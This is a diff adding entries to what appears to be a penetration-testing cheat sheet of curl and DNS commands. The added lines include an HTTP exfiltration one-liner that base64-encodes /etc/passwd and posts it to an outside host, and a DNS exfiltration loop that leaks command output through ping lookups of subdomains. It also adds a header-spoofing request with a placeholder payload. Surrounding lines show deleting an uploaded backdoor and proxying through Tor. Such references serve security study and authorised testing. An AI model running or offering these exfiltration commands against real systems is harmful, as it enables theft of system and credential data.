@@ -128,12 +128,20 @@ related:
 >```
 > curl -X DELETE http://example.com/upload/backdor.php 
 > ```
+> Modify Header
+> ```
+> curl http://example.com -H "User-Agent: Mozila" -H "Host: www.google.com" -d "BadPayload"
+> ```
 > Proxy
 > ```
 > curl --socks5-hostname 127.0.0.1:9050 https://ifconfig.me
 > ```
 > ```
 > curl -x 127.0.0.1:9050 https://ifconfig.me
+> ```
+> HTTP Exfiltration
+> ```
+> curl example.com -d "$(cat /etc/passwd | base64)"
 > ```
 
 > [!danger]- DNS
@@ -151,6 +159,10 @@ related:
 > ```
 > ```
 > dig -axfr @nsztm1.digi.ninja zonetransfer.me
+> ```
+> ### DNS Exfiltration
+> ```
+> id | xxd -ps | while read li;do ping -c 1 $li.example.com ;done
 > ```
 
 > [!danger]- Directory Enumeration
